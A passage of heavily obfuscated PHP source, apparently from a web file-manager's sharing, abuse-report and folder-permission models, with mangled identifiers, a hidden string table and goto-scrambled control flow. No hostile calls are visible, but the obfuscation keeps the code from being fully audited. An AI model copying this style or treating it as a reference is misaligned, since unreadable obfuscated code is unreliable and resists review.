strpos($cÄÅÉæÜÍ„[$cœÃçÔ‡‚‘[454]], $Eê™‚¬‹»§)); $EÈôÑÍ”Äì = array($cœÃçÔ‡‚‘[365] => array($cœÃçÔ‡‚‘[7], trim($B»ÚôÁ•ç, $cœÃçÔ‡‚‘[47]))); $C·ºš”­ä´ = Model($cœÃçÔ‡‚‘[754])->where($EÈôÑÍ”Äì)->field($cœÃçÔ‡‚‘[28])->select(); goto d‚Æ‰ÓâÉ‚; eÙñŠô¤Î½: $EÈôÑÍ”Äì = array($cœÃçÔ‡‚‘[414] => array($cœÃçÔ‡‚‘[7], $a¬Ê°áÃå), $cœÃçÔ‡‚‘[454] => array($cœÃçÔ‡‚‘[753], "\x25{$Eê™‚¬‹»§}\x25"), $cœÃçÔ‡‚‘[392] => 0); $cÄÅÉæÜÍ„ = Model($cœÃçÔ‡‚‘[754])->where($EÈôÑÍ”Äì)->field($cœÃçÔ‡‚‘[2215])->find(); if (!$cÄÅÉæÜÍ„) { return !1; } goto fÇµâ… µ; aœ¸¾ñ›µï: if (!$a¬Ê°áÃå) { return !1; } $a¬Ê°áÃå = array_to_keyvalue($a¬Ê°áÃå, $cœÃçÔ‡‚‘[33], $cœÃçÔ‡‚‘[414]); $Eê™‚¬‹»§ = $cœÃçÔ‡‚‘[47] . $d¢³éŒáê† . $cœÃçÔ‡‚‘[47]; goto eÙñŠô¤Î½; dîœ†àí¸Å: } protected function remove($fÂÍôôŠ™Ÿ) { goto eÚ¥ã–ÈÜ; eÚ¥ã–ÈÜ: $e‡‚¾µ¸İ¾ =& $_SERVER[Õİõş]; if (is_array($fÂÍôôŠ™Ÿ)) { $fÂÍôôŠ™Ÿ = array($e‡‚¾µ¸İ¾[7], $fÂÍôôŠ™Ÿ); } $B‘ª§³Êß = array($e‡‚¾µ¸İ¾[436] => $fÂÍôôŠ™Ÿ); goto fÆš¨æ¡ãÎ; fÆš¨æ¡ãÎ: $e¿çÈÙÙ™ô = $this->where($B‘ª§³Êß)->delete(); if ($e¿çÈÙÙ™ô) { Model($e‡‚¾µ¸İ¾[532])->where(array($e‡‚¾µ¸İ¾[436] => $fÂÍôôŠ™Ÿ))->delete(); } $eª·È²í›± = is_array($fÂÍôôŠ™Ÿ) ? $fÂÍôôŠ™Ÿ[1] : array($fÂÍôôŠ™Ÿ); goto FˆšÏÇ´ó; FˆšÏÇ´ó: for ($AÌæ×Æ³“è = 0; $AÌæ×Æ³“è < count($eª·È²í›±); $AÌæ×Æ³“è++) { $B‚•÷’—… = $this->getInfo($eª·È²í›±[$AÌæ×Æ³“è]); if ($B‚•÷’—…[$e‡‚¾µ¸İ¾[443]] == $e‡‚¾µ¸İ¾[83]) { Model($e‡‚¾µ¸İ¾[500])->eventShare($B‚•÷’—…[$e‡‚¾µ¸İ¾[365]], $e‡‚¾µ¸İ¾[2201]); } if ($B‚•÷’—…[$e‡‚¾µ¸İ¾[441]] == $e‡‚¾µ¸İ¾[83]) { Model($e‡‚¾µ¸İ¾[500])->eventShare($B‚•÷’—…[$e‡‚¾µ¸İ¾[365]], $e‡‚¾µ¸İ¾[2200]); } } return $e¿çÈÙÙ™ô; goto D„éîÒ¯×õ; D„éîÒ¯×õ: } protected function removeBySource($e­ÊœòŒÊ) { goto D›İÑñŞÄ; aó—Âéê…¬: $dËˆº…Üì = array_to_keyvalue($dËˆº…Üì, $a…Şã²“[33], $a…Şã²“[436]); if (!$dËˆº…Üì) { return; } $f¿ÆÃÈÖˆ = array($a…Şã²“[435] => array($a…Şã²“[380], $dËˆº…Üì)); goto D„¶õ™Í‡Ë; D›İÑñŞÄ: $a…Şã²“ =& $_SERVER[Õİõş]; $f¿ÆÃÈÖˆ = array($a…Şã²“[379] => array($a…Şã²“[380], $e­ÊœòŒÊ)); $dËˆº…Üì = $this->field($a…Şã²“[436])->where($f¿ÆÃÈÖˆ)->select(); goto aó—Âéê…¬; D„¶õ™Í‡Ë: $this->where($f¿ÆÃÈÖˆ)->delete(); Model($a…Şã²“[532])->where($f¿ÆÃÈÖˆ)->delete(); goto A›ô’²¾õî; A›ô’²¾õî: } public function listAll($b‘ÁÈÀÕë„) { goto C¶·Š¶­•ê; C¶·Š¶­•ê: $dï÷ª‰Ş‚ =& $_SERVER[Õİõş]; $bìçßÈØ = array(); if ($b‘ÁÈÀÕë„[$dï÷ª‰Ş‚[1417]]) { $bìçßÈØ[$dï÷ª‰Ş‚[1417]] = $b‘ÁÈÀÕë„[$dï÷ª‰Ş‚[1417]]; } goto A¹òçŸª³“; C‚ÃèÊ§çí: return $fÃÂ•ùŒ…; goto B‡°ïÉß‡; A¹òçŸª³“: if ($b‘ÁÈÀÕë„[$dï÷ª‰Ş‚[704]]) { $f¶¾©ßˆ’ = $b‘ÁÈÀÕë„[$dï÷ª‰Ş‚[705]] ? $b‘ÁÈÀÕë„[$dï÷ª‰Ş‚[705]] : strtotime(date($dï÷ª‰Ş‚[2216])); $bìçßÈØ[$dï÷ª‰Ş‚[183]] = array($dï÷ª‰Ş‚[317], array($b‘ÁÈÀÕë„[$dï÷ª‰Ş‚[704]], $f¶¾©ßˆ’)); } if ($b‘ÁÈÀÕë„[$dï÷ª‰Ş‚[29]]) { $bìçßÈØ[$b‘ÁÈÀÕë„[$dï÷ª‰Ş‚[29]]] = 1; } else { $bìçßÈØ[] = array($dï÷ª‰Ş‚[441] => array($dï÷ª‰Ş‚[930], 0), $dï÷ª‰Ş‚[443] => array($dï÷ª‰Ş‚[930], 0), $dï÷ª‰Ş‚[2191] => $dï÷ª‰Ş‚[2160]); } if ($b‘ÁÈÀÕë„[$dï÷ª‰Ş‚[2156]]) { $bìçßÈØ[] = array($dï÷ª‰Ş‚[438] => $b‘ÁÈÀÕë„[$dï÷ª‰Ş‚[2156]], $dï÷ª‰Ş‚[1325] => array($dï÷ª‰Ş‚[753], "\x25{$b‘ÁÈÀÕë„[$dï÷ª‰Ş‚[2156]]}\45"), $dï÷ª‰Ş‚[2191] => $dï÷ª‰Ş‚[2160]); } goto dóºãõ÷˜ã; dóºãõ÷˜ã: $fÃÂ•ùŒ… = $this->_makeOrder()->where($bìçßÈØ)->selectPage(20); if (empty($fÃÂ•ùŒ…[$dï÷ª‰Ş‚[350]])) { return array(); } $this->_listDataApply($fÃÂ•ùŒ…[$dï÷ª‰Ş‚[350]]); goto C‚ÃèÊ§çí; B‡°ïÉß‡: } public function listDataApply($CŞÆôÊ¼) { $this->_listDataApply($CŞÆôÊ¼); return $CŞÆôÊ¼; } private function _listDataApply(&$dÈ¨¤Öóùš) { $aÜ¸ÒŠĞŞ™ =& $_SERVER[Õİõş]; $bÇÉáÌˆ‹¬ = array_to_keyvalue($dÈ¨¤Öóùš, $aÜ¸ÒŠĞŞ™[33], $aÜ¸ÒŠĞŞ™[1417]); $bÛ›¼Â´Øù = Model($aÜ¸ÒŠĞŞ™[472])->userListInfo(array_unique($bÇÉáÌˆ‹¬)); $d˜²Ö‚°„ = array_to_keyvalue($dÈ¨¤Öóùš, $aÜ¸ÒŠĞŞ™[33], $aÜ¸ÒŠĞŞ™[365]); $fÚñÒÜİ¿ = Model($aÜ¸ÒŠĞŞ™[754])->sourceListInfo($d˜²Ö‚°„, !0); foreach ($dÈ¨¤Öóùš as &$A–åƒè×í„) { $FËÛƒ»ó†Ï = $A–åƒè×í„[$aÜ¸ÒŠĞŞ™[1417]]; $A–åƒè×í„[$aÜ¸ÒŠĞŞ™[2217]] = $bÛ›¼Â´Øù[$FËÛƒ»ó†Ï] ? $bÛ›¼Â´Øù[$FËÛƒ»ó†Ï] : !1; $D˜Ò¼Ÿå¬Ï = $A–åƒè×í„[$aÜ¸ÒŠĞŞ™[365]]; $A–åƒè×í„[$aÜ¸ÒŠĞŞ™[387]] = $fÚñÒÜİ¿[$D˜Ò¼Ÿå¬Ï] ? $fÚñÒÜİ¿[$D˜Ò¼Ÿå¬Ï] : !1; } } private function _makeOrder($C™éÈÛ¥Ä = '') { goto e±Ã¿ö‹ºŠ; A§ğçÊÏš£: $C™éÈÛ¥Ä = $C™éÈÛ¥Ä . "{$CÂíÍ¬»—}\x20{$A·¨©×²”œ}"; return $this->order($C™éÈÛ¥Ä); goto FÀ»ÇßÔî¿; D òóêÉÀ: $CÂíÍ¬»— = Input::get($Cˆ–º™´”á[402], $Cˆ–º™´”á[7], $Cˆ–º™´”á[385], $AâİÏÖÇì¢); $A·¨©×²”œ = Input::get($Cˆ–º™´”á[403], $Cˆ–º™´”á[7], $Cˆ–º™´”á[2218], array($Cˆ–º™´”á[2155], $Cˆ–º™´”á[399])); $A·¨©×²”œ = $Cïˆ„‚ø¬Í[$A·¨©×²”œ]; goto A§ğçÊÏš£; e±Ã¿ö‹ºŠ: $Cˆ–º™´”á =& $_SERVER[Õİõş]; $AâİÏÖÇì¢ = array($Cˆ–º™´”á[183], $Cˆ–º™´”á[705], $Cˆ–º™´”á[2203], $Cˆ–º™´”á[2204]); $Cïˆ„‚ø¬Í = array($Cˆ–º™´”á[397] => $Cˆ–º™´”á[398], $Cˆ–º™´”á[399] => $Cˆ–º™´”á[400]); goto D òóêÉÀ; FÀ»ÇßÔî¿: } public function reportAdd($d°‚’ØÈ¼) { $bËÓÑè¾î =& $_SERVER[Õİõş]; $FƒŸ™Ü³ŞŞ = array($bËÓÑè¾î[436] => $d°‚’ØÈ¼[$bËÓÑè¾î[436]], $bËÓÑè¾î[1417] => USER_ID); if (Model($bËÓÑè¾î[2214])->where($FƒŸ™Ü³ŞŞ)->find()) { return !1; } $d§ÍË¾« = array($bËÓÑè¾î[436] => $d°‚’ØÈ¼[$bËÓÑè¾î[436]], $bËÓÑè¾î[1325] => $d°‚’ØÈ¼[$bËÓÑè¾î[1325]], $bËÓÑè¾î[365] => $d°‚’ØÈ¼[$bËÓÑè¾î[365]], $bËÓÑè¾î[414] => $d°‚’ØÈ¼[$bËÓÑè¾î[414]], $bËÓÑè¾î[1417] => USER_ID, $bËÓÑè¾î[29] => $d°‚’ØÈ¼[$bËÓÑè¾î[29]], $bËÓÑè¾î[400] => $d°‚’ØÈ¼[$bËÓÑè¾î[400]]); return Model($bËÓÑè¾î[2214])->add($d§ÍË¾«); } public function reportList($d½•¦œÙ) { goto e­¨®÷³–•; cì¡®ªÖ±: $f„¬ó—ëäö = array($eÒ—ˆºŠŒ©[397] => $eÒ—ˆºŠŒ©[398], $eÒ—ˆºŠŒ©[399] => $eÒ—ˆºŠŒ©[400]); $BÓ¡ÂÄœ  = $eÒ—ˆºŠŒ©[2222] . $f„¬ó—ëäö[$DĞ„„Æ¯ÊÒ]; $d¢õè³Ôà‚ = Model($eÒ—ˆºŠŒ©[2214])->where($C¾‚‡±Ûğæ)->order($BÓ¡ÂÄœ )->selectPage(20); goto cŒùÅÁˆõ; CÏ¨ğ¸Ê¶¶: if (isset($d½•¦œÙ[$eÒ—ˆºŠŒ©[29]]) && in_array($d½•¦œÙ[$eÒ—ˆºŠŒ©[29]], array($eÒ—ˆºŠŒ©[83], $eÒ—ˆºŠŒ©[2219], $eÒ—ˆºŠŒ©[2220], $eÒ—ˆºŠŒ©[2221], $eÒ—ˆºŠŒ©[1896]))) { $C¾‚‡±Ûğæ[$eÒ—ˆºŠŒ©[29]] = $d½•¦œÙ[$eÒ—ˆºŠŒ©[29]]; } if (isset($d½•¦œÙ[$eÒ—ˆºŠŒ©[691]]) && in_array($d½•¦œÙ[$eÒ—ˆºŠŒ©[691]], array($eÒ—ˆºŠŒ©[463], $eÒ—ˆºŠŒ©[83], $eÒ—ˆºŠŒ©[2219], $eÒ—ˆºŠŒ©[2220]))) { $C¾‚‡±Ûğæ[$eÒ—ˆºŠŒ©[691]] = $d½•¦œÙ[$eÒ—ˆºŠŒ©[691]]; } $DĞ„„Æ¯ÊÒ = Input::get($eÒ—ˆºŠŒ©[403], $eÒ—ˆºŠŒ©[7], $eÒ—ˆºŠŒ©[2218], array($eÒ—ˆºŠŒ©[2155], $eÒ—ˆºŠŒ©[399])); goto cì¡®ªÖ±; e­¨®÷³–•: $eÒ—ˆºŠŒ© =& $_SERVER[Õİõş]; $C¾‚‡±Ûğæ = array(); if ($d½•¦œÙ[$eÒ—ˆºŠŒ©[704]]) { $eğ‡Ñƒ²ï = $d½•¦œÙ[$eÒ—ˆºŠŒ©[705]] ? $d½•¦œÙ[$eÒ—ˆºŠŒ©[705]] : strtotime(date($eÒ—ˆºŠŒ©[2216])); $C¾‚‡±Ûğæ[$eÒ—ˆºŠŒ©[183]] = array($eÒ—ˆºŠŒ©[317], array($d½•¦œÙ[$eÒ—ˆºŠŒ©[704]], $eğ‡Ñƒ²ï)); } goto CÏ¨ğ¸Ê¶¶; cŒùÅÁˆõ: if (empty($d¢õè³Ôà‚[$eÒ—ˆºŠŒ©[350]])) { return array(); } $this->_listDataApply($d¢õè³Ôà‚[$eÒ—ˆºŠŒ©[350]]); return $d¢õè³Ôà‚; goto EİŞ‚³ÇÏÉ; EİŞ‚³ÇÏÉ: } public function reportStatus($d”ÀŠá¢ã) { goto fŸÃ„”ÂºÁ; fŸÃ„”ÂºÁ: $fÃÊ¿®ßô× =& $_SERVER[Õİõş]; $b ôÓÓ¨ = array($fÃÊ¿®ßô×[363] => $d”ÀŠá¢ã[$fÃÊ¿®ßô×[363]]); $D÷ÆàÇ±ğ  = Model($fÃÊ¿®ßô×[2214])->where($b ôÓÓ¨)->field($fÃÊ¿®ßô×[2223])->find(); goto dÎ±¬Í¬Ğ´; EÔ»§µ¶ñ: $E¢˜‘ß ó = Model($fÃÊ¿®ßô×[2214])->where($b ôÓÓ¨)->save($d¶£‰Í¯Æ°); if ($d”ÀŠá¢ã[$fÃÊ¿®ßô×[691]] == $fÃÊ¿®ßô×[2219]) { if ($D÷ÆàÇ±ğ [$fÃÊ¿®ßô×[414]] != $fÃÊ¿®ßô×[463] && $this->shareFileMeta($D÷ÆàÇ±ğ [$fÃÊ¿®ßô×[414]])) { $this->shareFileMeta($D÷ÆàÇ±ğ [$fÃÊ¿®ßô×[414]], 0); } return $this->remove($D÷ÆàÇ±ğ [$fÃÊ¿®ßô×[436]]); } if ($E¢˜‘ß ó && $d”ÀŠá¢ã[$fÃÊ¿®ßô×[691]] == $fÃÊ¿®ßô×[2220]) { $B¹±ãÂÉ‰À = $d¶£‰Í¯Æ°[$fÃÊ¿®ßô×[691]] == $fÃÊ¿®ßô×[2220] ? 1 : 0; $this->shareFileMeta($D÷ÆàÇ±ğ [$fÃÊ¿®ßô×[414]], $B¹±ãÂÉ‰À); $this->removeByFile($D÷ÆàÇ±ğ [$fÃÊ¿®ßô×[414]]); } goto c™³×»…„®; c™³×»…„®: return $E¢˜‘ß ó; goto d¾ÛŒÅÍƒè; dÎ±¬Í¬Ğ´: if (!$D÷ÆàÇ±ğ ) { return !1; } $d¶£‰Í¯Æ° = array($fÃÊ¿®ßô×[691] => $d”ÀŠá¢ã[$fÃÊ¿®ßô×[691]]); if ($d”ÀŠá¢ã[$fÃÊ¿®ßô×[691]] == $fÃÊ¿®ßô×[2220] && $D÷ÆàÇ±ğ [$fÃÊ¿®ßô×[691]] == $fÃÊ¿®ßô×[2220]) { $d¶£‰Í¯Æ°[$fÃÊ¿®ßô×[691]] = 0; } goto EÔ»§µ¶ñ; d¾ÛŒÅÍƒè: } private function removeByFile($d‡İƒòÈõ¶) { goto fî—ƒ„×Òº; fî—ƒ„×Òº: $e¼ë×Şò“ =& $_SERVER[Õİõş]; $bèŒÁÅ‚¸ = Model($e¼ë×Şò“[754])->where(array($e¼ë×Şò“[414] => $d‡İƒòÈõ¶))->field($e¼ë×Şò“[365])->select(); $fÊÌº‘ÃáÓ = array_to_keyvalue($bèŒÁÅ‚¸, $e¼ë×Şò“[33], $e¼ë×Şò“[365]); goto Aí´ºƒÏÖ­; Aí´ºƒÏÖ­: $EÎÙ±ô¤É = array($e¼ë×Şò“[365] => array($e¼ë×Şò“[7], $fÊÌº‘ÃáÓ), $e¼ë×Şò“[441] => 1); $bèŒÁÅ‚¸ = Model($e¼ë×Şò“[2057])->where($EÎÙ±ô¤É)->field($e¼ë×Şò“[436])->select(); if (empty($bèŒÁÅ‚¸)) { return; } goto a†éö“ê; a†éö“ê: $C‡®¯Š•¶² = array_to_keyvalue($bèŒÁÅ‚¸, $e¼ë×Şò“[33], $e¼ë×Şò“[436]); $this->remove($C‡®¯Š•¶²); goto BøÕ†®Š»¬; BøÕ†®Š»¬: } private function shareFileMeta($C™Ñ¤„’¯», $C³ÏåŠ¹òå = null) { $F„ë„á²—â =& $_SERVER[Õİõş]; $CÄ•ùŠ‹ÑÒ = array($F„ë„á²—â[414] => $C™Ñ¤„’¯», $F„ë„á²—â[89] => $F„ë„á²—â[2224]); if (is_null($C³ÏåŠ¹òå)) { return Model($F„ë„á²—â[2225])->where($CÄ•ùŠ‹ÑÒ)->find(); } $CÄ•ùŠ‹ÑÒ[$F„ë„á²—â[355]] = $C³ÏåŠ¹òå; Model($F„ë„á²—â[2225])->add($CÄ•ùŠ‹ÑÒ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\162\143\x65\x5f\141\x75\164\x68"; public function getAuth($fÆ—°Ğ­Œ) { goto A±¼ñ„ØºÔ; bÙÑ©¯’¦: $a®ÈŸ½¾õ¾ = $this->field($f‘®øÚ£ğ³)->order($dª‘÷¦Õš[363])->where($DÜÒ’Š­´Ù)->select(); $Aßæ‚˜Ïñà = array(); foreach ($a®ÈŸ½¾õ¾ as $fÄÛŠå÷Àè) { if (Model($dª‘÷¦Õš[2227])->listData($fÄÛŠå÷Àè[$dª‘÷¦Õš[2208]])) { $Aßæ‚˜Ïñà[] = $fÄÛŠå÷Àè; } } goto f›¹­ŸË¥æ; f›¹­ŸË¥æ: return $Aßæ‚˜Ïñà; goto Eš‰¬È Ä; A±¼ñ„ØºÔ: $dª‘÷¦Õš =& $_SERVER[Õİõş]; $f‘®øÚ£ğ³ = $dª‘÷¦Õš[2226]; $DÜÒ’Š­´Ù = array($dª‘÷¦Õš[365] => $fÆ—°Ğ­Œ); goto bÙÑ©¯’¦; Eš‰¬È Ä: } public function setAuth($Fôà·™Ò‹, $c¶ë„ÂÒ•Á) { goto AŸİ­•‚Ãø; AŸİ­•‚Ãø: $Eáí¬âÄÉÈ =& $_SERVER[Õİõş]; $A¤¶‡Ï…Î„ = Model($Eáí¬âÄÉÈ[1113])->sourceInfo($Fôà·™Ò‹); if ($A¤¶‡Ï…Î„[$Eáí¬âÄÉÈ[367]] != SourceModel::TYPE_GROUP) { return !1; } goto FôÒÚÒª½; A“­ô¡å: $this->where(array($Eáí¬âÄÉÈ[379] => $Fôà·™Ò‹))->delete(); $this->addAll($aŠ•„‰İ˜Ô); return !0; goto e„Í™¢Ö³¸; Cé©êê‹Î: $Dù‘™ƒ›¥– = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $aŠ•„‰İ˜Ô = array(); foreach ($c¶ë„ÂÒ•Á as $e¶ƒó¬ô) { if (!in_array($e¶ƒó¬ô[$Eáí¬âÄÉÈ[367]], $Dù‘™ƒ›¥–)) { show_json(LNG($Eáí¬âÄÉÈ[2228]), !1); } if ($CåÂë¢‡º… != $F…™ø¦) { if ($e¶ƒó¬ô[$Eáí¬âÄÉÈ[367]] == SourceModel::TYPE_GROUP) { } if ($e¶ƒó¬ô[$Eáí¬âÄÉÈ[451]] != 0 && !in_array($e¶ƒó¬ô[$Eáí¬âÄÉÈ[451]], $Dí¬ƒ¸ò)) { } } if ($e¶ƒó¬ô[$Eáí¬âÄÉÈ[451]] == 0) { $e¶ƒó¬ô[$Eáí¬âÄÉÈ[367]] = SourceModel::TYPE_USER; } $aŠ•„‰İ˜Ô[] = array($Eáí¬âÄÉÈ[365] => $Fôà·™Ò‹, $Eáí¬âÄÉÈ[367] => intval($e¶ƒó¬ô[$Eáí¬âÄÉÈ[367]]), $Eáí¬âÄÉÈ[451] => intval($e¶ƒó¬ô[$Eáí¬âÄÉÈ[451]]), $Eáí¬âÄÉÈ[2208] => intval($e¶ƒó¬ô[$Eáí¬âÄÉÈ[2208]]) ? intval($e¶ƒó¬ô[$Eáí¬âÄÉÈ[2208]]) : 0, $Eáí¬âÄÉÈ[2209] => intval($e¶ƒó¬ô[$Eáí¬âÄÉÈ[2209]]) ? intval($e¶ƒó¬ô[$Eáí¬âÄÉÈ[2209]]) : -1); } goto A“­ô¡å; FôÒÚÒª½: $F…™ø¦ = 1; $CåÂë¢‡º… = $A¤¶‡Ï…Î„[$Eáí¬âÄÉÈ[451]]; if ($CåÂë¢‡º… != $F…™ø¦) { $a·ø…Œ÷å‚ = array($Eáí¬âÄÉÈ[2080] => $CåÂë¢‡º…); $Dí¬ƒ¸ò = Model($Eáí¬âÄÉÈ[2154])->field($Eáí¬âÄÉÈ[1417])->where($a·ø…Œ÷å‚)->select(); $Dí¬ƒ¸ò = array_to_keyvalue($Dí¬ƒ¸ò, $Eáí¬âÄÉÈ[33], $Eáí¬âÄÉÈ[1417]); } goto Cé©êê‹Î; e„Í™¢Ö³¸: } public function authClear($Bìù”¸øƒ) { $c¿Ê‡¹Ò =& $_SERVER[Õİõş]; $BøçÈ¿ê‘É = Model($c¿Ê‡¹Ò[1113])->sourceInfo($Bìù”¸øƒ); $A½½ÙÑŠÑĞ = array($Bìù”¸øƒ); if ($BøçÈ¿ê‘É[$c¿Ê‡¹Ò[366]] == $c¿Ê‡¹Ò[83]) { $bøŒÊê©¯ = array($c¿Ê‡¹Ò[520] => array($c¿Ê‡¹Ò[478], $BøçÈ¿ê‘É[$c¿Ê‡¹Ò[454]] . $Bìù”¸øƒ . $c¿Ê‡¹Ò[479])); $A½½ÙÑŠÑĞ = Model($c¿Ê‡¹Ò[1113])->field($c¿Ê‡¹Ò[379])->where($bøŒÊê©¯)->getField($c¿Ê‡¹Ò[365], !0); $A½½ÙÑŠÑĞ[] = $Bìù”¸øƒ; } $this->where(array($c¿Ê‡¹Ò[379] => array($c¿Ê‡¹Ò[380], $A½½ÙÑŠÑĞ)))->delete(); return !0; } public function get($eŒÖ®¸Öä) { $AìÖˆˆäË = $this->getSourceList(array($eŒÖ®¸Öä), !0); return $AìÖˆˆäË[0]; } public function getSourceList($eÕÉÛ´¾±, $Bã½‰‡‚ï = false) { goto DŠ×‰Ã Ø; dÌğ«Å¡Šœ: $Cè¡‘â‚ƒ = array_values(array_unique($Cè¡‘â‚ƒ)); if (!$Cè¡‘â‚ƒ) { return array(); } $FÀ©ÁŸİ¨® = $C˜„©‹ äç[2230]; goto dêˆˆŒ¾õÉ; DíÈø‹š›: $AÒ¡î–ï» = array(); foreach ($Bã½‰‡‚ï as $cñÊ¬Š¶¬” => $dƒ”¢İí½š) { $AÒ¡î–ï»[$cñÊ¬Š¶¬”] = $this->makeSourceAuth($dƒ”¢İí½š, $cÓøƒÌĞÖ); } return $AÒ¡î–ï»; goto AÃ¦¬™ƒç­; DŠ×‰Ã Ø: $C˜„©‹ äç =& $_SERVER[Õİõş]; if (!$eÕÉÛ´¾±) { return array(); } $cË½º‹òŸ‡ = Model($C˜„©‹ äç[1113]); goto cÜÜÅõš££; cÜÜÅõš££: if (!$Bã½‰‡‚ï) { $D”•¬¢˜ê = array($C˜„©‹ äç[379] => array($C˜„©‹ äç[380], $eÕÉÛ´¾±)); $Bã½‰‡‚ï = $cË½º‹òŸ‡->field($C˜„©‹ äç[2229])->where($D”•¬¢˜ê)->select(); $Bã½‰‡‚ï = array_to_keyvalue($Bã½‰‡‚ï, $C˜„©‹ äç[365]); } $Cè¡‘â‚ƒ = $eÕÉÛ´¾±; foreach ($Bã½‰‡‚ï as $DŸöš¼‡· => $bÆ©Öö²Ô˜) { $c’–“ëÜÅ = $cË½º‹òŸ‡->parentLevelArray($bÆ©Öö²Ô˜[$C˜„©‹ äç[454]]); $Cè¡‘â‚ƒ = array_merge($Cè¡‘â‚ƒ, $c’–“ëÜÅ, array($DŸöš¼‡·)); } goto dÌğ«Å¡Šœ; dêˆˆŒ¾õÉ: $D”•¬¢˜ê = array($C˜„©‹ äç[379] => array($C˜„©‹ äç[380], $Cè¡‘â‚ƒ)); $cÓøƒÌĞÖ = $this->field($FÀ©ÁŸİ¨®)->where($D”•¬¢˜ê)->select(); $cÓøƒÌĞÖ = array_to_keyvalue_group($cÓøƒÌĞÖ, $C˜„©‹ äç[365]); goto DíÈø‹š›; AÃ¦¬™ƒç­: } public function authDeepCheck($d¸¬†ÉáÄÚ, $cù¥…æ–’Ğ = false) { $AÁóÄ–ëàÛ =& $_SERVER[Õİõş]; if (_get($GLOBALS, $AÁóÄ–ëàÛ[452])) { return !1; } $Aêñö«÷Àƒ = $this->makeAuthDeep(); if (!in_array($d¸¬†ÉáÄÚ, $Aêñö«÷Àƒ)) { return !1; } return array($AÁóÄ–ëàÛ[373] => -1, $AÁóÄ–ëàÛ[413] => array($AÁóÄ–ëàÛ[381] => $AÁóÄ–ëàÛ[1034], $AÁóÄ–ëàÛ[2086] => $AÁóÄ–ëàÛ[463], $AÁóÄ–ëàÛ[382] => LNG($AÁóÄ–ëàÛ[2231]), $AÁóÄ–ëàÛ[2098] => $AÁóÄ–ëàÛ[2232])); } protected function makeAuthDeep() { goto cõİ«œ¿£; aÏ–·Ê²İÉ: $Cì¢åí¡é¥ = array_values(array_unique($Cì¢åí¡é¥)); $DÏáÔ‘ĞƒÑ = $Cì¢åí¡é¥; foreach ($DÏáÔ‘ĞƒÑ as $F‘õòÙ³é) { $c¯ºö‰…» = $C…ÂÔÅÇ©Ù->getInfo($F‘õòÙ³é); $BÎøé…“Í = $C‹Î›¢Œ“¯->parentLevelArray($c¯ºö‰…»[$aÚÎ÷Áƒ[454]]); $Cì¢åí¡é¥ = array_merge($Cì¢åí¡é¥, $BÎøé…“Í); } goto cºÖƒÑñ˜; C²šè°ñÌ: $C‹Î›¢Œ“¯ = Model($aÚÎ÷Áƒ[1113]); $C…ÂÔÅÇ©Ù = Model($aÚÎ÷Áƒ[453]); if ($EÈåàä¶ØÏ) { $d«ì¶ÒñÑ” = $C‹Î›¢Œ“¯->where(array($aÚÎ÷Áƒ[365] => array($aÚÎ÷Áƒ[380], $EÈåàä¶ØÏ)))->select(); foreach ($d«ì¶ÒñÑ” as $E„•¶’¤é¬) { $BÎøé…“Í = $C‹Î›¢Œ“¯->parentLevelArray($E„•¶’¤é¬[$aÚÎ÷Áƒ[454]]); $cÁ”èñ…î’ = array_merge($cÁ”èñ…î’, $BÎøé…“Í); $Cì¢åí¡é¥[] = $E„•¶’¤é¬[$aÚÎ÷Áƒ[451]]; } } goto aÏ–·Ê²İÉ; BŠ´ÙË”ĞŒ: $B™—šÒº™˜ = Session::get($aÚÎ÷Áƒ[2192]); $B™—šÒº™˜ = array_to_keyvalue($B™—šÒº™˜, $aÚÎ÷Áƒ[33], $aÚÎ÷Áƒ[2080]); $bŒ¸˜×¦„ = array($aÚÎ÷Áƒ[367] => SourceModel::TYPE_USER, $aÚÎ÷Áƒ[451] => USER_ID); goto CË¡õ„‡„Â; cºÖƒÑñ˜: $Cì¢åí¡é¥ = array_values(array_unique($Cì¢åí¡é¥)); foreach ($Cì¢åí¡é¥ as $F‘õòÙ³é) { $c¯ºö‰…» = $C…ÂÔÅÇ©Ù->getInfo($F‘õòÙ³é); $cÁ”èñ…î’[] = $c¯ºö‰…»[$aÚÎ÷Áƒ[387]][$aÚÎ÷Áƒ[365]]; } $cÁ”èñ…î’ = array_values(array_unique($cÁ”èñ…î’)); goto fğ»š¸‘ˆğ; fğ»š¸‘ˆğ: return $cÁ”èñ…î’; goto BŞø§‡´˜Í; CË¡õ„‡„Â: if ($B™—šÒº™˜) { $bŒ¸˜×¦„ = array(array($aÚÎ÷Áƒ[367] => SourceModel::TYPE_USER, $aÚÎ÷Áƒ[451] => USER_ID), array($aÚÎ÷Áƒ[367] => SourceModel::TYPE_GROUP, $aÚÎ÷Áƒ[451] => array($aÚÎ÷Áƒ[380], $B™—šÒº™˜)), $aÚÎ÷Áƒ[918] => $aÚÎ÷Áƒ[2160]); } if ($fÅµ²”šÅ) { $bŒ¸˜×¦„ = array($bŒ¸˜×¦„, $aÚÎ÷Áƒ[2208] => array($aÚÎ÷Áƒ[2234], $fÅµ²”šÅ)); } $FÜâòãô = $this->field($aÚÎ÷Áƒ[2235])->where($bŒ¸˜×¦„)->select(); goto A‚¹Š¤´ƒ; A‚¹Š¤´ƒ: $EÈåàä¶ØÏ = array_to_keyvalue($FÜâòãô, $aÚÎ÷Áƒ[33], $aÚÎ÷Áƒ[365]); $cÁ”èñ…î’ = array(); $Cì¢åí¡é¥ = $B™—šÒº™˜; goto C²šè°ñÌ; cõİ«œ¿£: $aÚÎ÷Áƒ =& $_SERVER[Õİõş]; static $cÁ”èñ…î’ = false; if ($cÁ”èñ…î’) { return $cÁ”èñ…î’; } goto Eà»¤ŸÒ±í; Eà»¤ŸÒ±í: $eÔ‚‹Ó¸äÑ = Model($aÚÎ÷Áƒ[2233])->listData(); $fÅµ²”šÅ = array(); foreach ($eÔ‚‹Ó¸äÑ as $Fê­“·èğ) { if ($Fê­“·èğ[$aÚÎ÷Áƒ[372]] == 0 && $Fê­“·èğ[$aÚÎ÷Áƒ[2100]] == $aÚÎ÷Áƒ[83]) { $fÅµ²”šÅ[] = $Fê­“·èğ[$aÚÎ÷Áƒ[363]]; } } goto BŠ´ÙË”ĞŒ; BŞø§‡´˜Í: } private function makeSourceAuth($Dò×èˆ­‘, $eÊ˜÷¨Œ±) { goto EÓÙŒ·¶ã¿; EÓÙŒ·¶ã¿: $bÑØã¢“Àß =& $_SERVER[Õİõş]; $B´­¼½†ˆß = Session::get($bÑØã¢“Àß[2192]); $a¢Ç‰ÇÏ = 